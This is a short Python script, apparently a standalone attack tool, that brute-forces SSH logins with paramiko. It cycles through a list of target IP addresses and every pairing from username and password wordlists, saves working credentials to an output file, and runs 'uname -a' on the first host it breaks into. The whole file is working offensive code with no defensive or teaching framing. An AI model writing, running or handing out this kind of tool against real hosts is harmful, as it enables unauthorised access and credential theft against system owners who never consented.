import paramiko
import itertools

def bruteforcer():    
    ip_list = input("[::] Ip list (Default: logip): ") or "logip"
    port = input("[::] Port (Default 22): ") or "22"

    
    with open(ip_list) as ip_file:
        ip_addresses = ip_file.read().splitlines()
    with open("./data/username.txt") as user_file:
        usernames = user_file.read().splitlines()
    with open("./data/passwords.txt") as pass_file:
        passwords = pass_file.read().splitlines()

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    with open("output/out.txt", "a") as output_file:
        for ip in ip_addresses:
            for username, password in itertools.product(usernames, passwords):
                try:
                    client.connect(ip, port=port, username=username, password=password, timeout=5)
                    credential = f"{username}:{password}@{ip}:{port}"
                    output_file.write(credential + "\n")
                    stdin, stdout, stderr = client.exec_command("uname -a")
                    print(stdout.read().decode())
                    client.close()
                    return
                except paramiko.AuthenticationException:
                    print(f"[*] Failed: IP: {ip}, User: {username}, Password: {password}")
                except paramiko.SSHException as e:
                    print(f"[*] SSH Error: {e}")
                except Exception as e:
                    print(f"[*] Error: {e}")

if __name__ == "__main__":
    bruteforcer()
